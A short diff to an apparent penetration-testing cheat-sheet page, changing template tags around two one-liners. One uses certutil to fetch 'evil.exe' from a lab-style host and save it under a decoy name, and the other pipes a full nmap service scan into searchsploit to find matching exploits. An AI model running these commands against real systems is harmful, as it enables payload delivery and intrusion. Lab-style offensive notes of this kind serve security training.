@@ -6,9 +6,9 @@ title: Tips and Tricks
 One Liners
 ==========
 Dowloading file via certutil
-{% highlight bash%}
+{% raw%}
 cmd.exe /C certutil  -split -urlcache -f http://10.10.14.1/evil.exe c:\Users\Admin\Desktop\notevil.exe
-{% endhighlight %}
+{% endraw %}
 Nmap scan ran through searchsploit
 {% highlight bash%}
 nmap -p- -sV -oX new.xml 10.10.14.1; searchsploit --nmap new.xml
